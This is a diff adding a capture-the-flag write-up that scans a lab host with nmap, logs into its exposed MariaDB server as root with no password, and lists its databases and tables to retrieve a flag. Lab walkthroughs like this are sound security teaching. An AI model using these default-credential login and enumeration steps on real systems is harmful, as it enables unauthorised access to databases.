@@ -1508,3 +1508,203 @@ Using nmap, we were able to discover the host had a webserver communicating on p
 
 
 [Table of Contents](#table-of-contents) 
+
+
+## Level 2: Sequel
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| ----------- | ----------- | ----------- |
+| 1 | 	IP Address   |    	10.129.3.85 | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.3.85
+
+PING 10.129.3.85 (10.129.3.85) 56(84) bytes of data.
+64 bytes from 10.129.3.85: icmp_seq=1 ttl=63 time=8.53 ms
+64 bytes from 10.129.3.85: icmp_seq=2 ttl=63 time=7.50 ms
+64 bytes from 10.129.3.85: icmp_seq=3 ttl=63 time=13.0 ms
+64 bytes from 10.129.3.85: icmp_seq=4 ttl=63 time=11.6 ms
+
+--- 10.129.3.85 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 7.503/10.148/12.968/2.216 ms
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: Probe open ports to determine service/version info
+```
+The results of nmap are:
+
+```
+└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.3.85        
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 15:08 EDT
+Nmap scan report for 10.129.3.85
+Host is up (0.0099s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql?
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+|   Thread ID: 66
+|   Capabilities flags: 63486
+|   Some Capabilities: SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Support41Auth, LongColumnFlag, IgnoreSigpipes, FoundRows, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolNew, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: *r'dCcI$uC,R;n9qPw,o
+|_  Auth Plugin Name: mysql_native_password
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 203.82 seconds
+
+
+```
+
+Our scan reveals only one open port to dissect; port 3306 a mysql database. 
+
+The first thing we can try is remotely connecting to the database.
+
+```
+─$ mysql -h 10.129.3.85
+
+ERROR 1045 (28000): Access denied for user 'kali'@'10.10.14.87' (using password: NO)
+
+```
+Our username was denied from connecting. We can try to brute-force other user names to get in.
+
+According to [dbschema](https://dbschema.com/2020/04/21/mysql-default-username-password/), the default credentials for a mysql database if left unchanged is ```root``` with no password.
+
+```
+└─$ mysql -h 10.129.3.85 -u root
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 76
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+
+```
+
+We were successful with our guess of the username/password!
+
+Now that we are in, we can query the potential databases.
+
+```
+MariaDB [(none)]> show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| htb                |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.013 sec)
+
+MariaDB [(none)]> 
+
+```
+
+We can start by browsing the first one called ```htb```:
+
+```
+MariaDB [(none)]> use htb;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [htb]> 
+
+```
+
+Now we can investigate the tables inside of database htb:
+
+```
+MariaDB [htb]> show tables;
+
++---------------+
+| Tables_in_htb |
++---------------+
+| config        |
+| users         |
++---------------+
+2 rows in set (0.014 sec)
+
+MariaDB [htb]> 
+```
+
+Next we can zoom in on each table, first starting with ```config```:
+
+```
+MariaDB [htb]> select * from config;
+
++----+-----------------------+----------------------------------+
+| id | name                  | value                            |
++----+-----------------------+----------------------------------+
+|  1 | timeout               | 60s                              |
+|  2 | security              | default                          |
+|  3 | auto_logon            | false                            |
+|  4 | max_size              | 2M                               |
+|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+|  6 | enable_uploads        | false                            |
+|  7 | authentication_method | radius                           |
++----+-----------------------+----------------------------------+
+7 rows in set (0.007 sec)
+
+MariaDB [htb]> 
+```
+Excitingly, we have finally revealed our eigth flag located on row 5 of the table!
+
+## Conclusions - Level 2 Sequel
+
+| # | 	Tools 	| Description |
+| ----------- | ----------- | ----------- |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	mysql   |    	Used to connect to MYSQL databases  | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
+| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
+
+Using nmap, we were able to discover the host had a MYSQL database located on port 3306. We were then able to get access to the database, a consequence of the administrator having poorly configured the default login credentials.
+
+[Table of Contents](#table-of-contents) 
+
